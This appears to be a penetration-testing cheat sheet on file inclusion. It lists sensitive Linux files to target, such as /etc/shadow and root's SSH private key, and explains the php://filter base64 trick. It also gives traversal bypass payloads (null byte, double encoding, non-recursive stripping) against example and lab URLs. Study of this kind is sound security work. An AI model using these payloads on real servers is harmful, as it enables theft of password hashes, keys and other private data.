# LFI / RFI

## Places to look if LFI is possible

| Location                    | Description                                                                                                                                                       |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /etc/issue                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| /etc/profile                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version               | specifies the version of the Linux kernel                                                                                                                         |
| /etc/passwd                 | has all registered user that has access to a system                                                                                                               |
| /etc/shadow                 | contains information about the system's users' passwords                                                                                                          |
| /root/.bash\_history        | contains the history commands for root user                                                                                                                       |
| /var/log/dmessage           | contains global system messages, including the messages that are logged during system startup                                                                     |
| /var/mail/root              | all emails for root user                                                                                                                                          |
| /root/.ssh/id\_rsa          | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| /var/log/apache2/access.log | the accessed requests for Apache webserver                                                                                                                        |
| C:\boot.ini                 | contains the boot options for computers with BIOS firmware                                                                                                        |
|                             |                                                                                                                                                                   |



**Copy cheat sheet**

[https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)



**PHP://** is a wrapper for Accessing various I/O streams. We&#x20;

**php://filter** — it is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. There are multiple parameters to this wrapper, we will use **convert.base64-encode/resource=** — This will convert the given file into base64 encoding and print it on screen. But we have to provide the resource what we want to read like a file name **index.php**.



**Bypasses**

<table><thead><tr><th>Bypass</th><th width="184.33333333333331">Explanation</th><th width="366.66666666666674">Example</th></tr></thead><tbody><tr><td>Bypass extension added</td><td>Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.</td><td>hxxp://10.10.230.14/lab3.php?file=../../../../../etc/passwd%00</td></tr><tr><td>PHP removing slashes</td><td>This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass.</td><td>hxxp://10.10.230.14/lab3.php?file=..//..//..//..//..//etc/passwd</td></tr><tr><td></td><td></td><td></td></tr></tbody></table>

### traversal sequences stripped non-recursively

```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

### **Null byte (%00)**

Bypass the append more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

```
http://example.com/index.php?page=../../../etc/passwd%00
```

### **Encoding**

You could use non-standard encondings like double URL encode (and others):

```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### From existent folder

Maybe the back-end is checking the folder path:

```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```



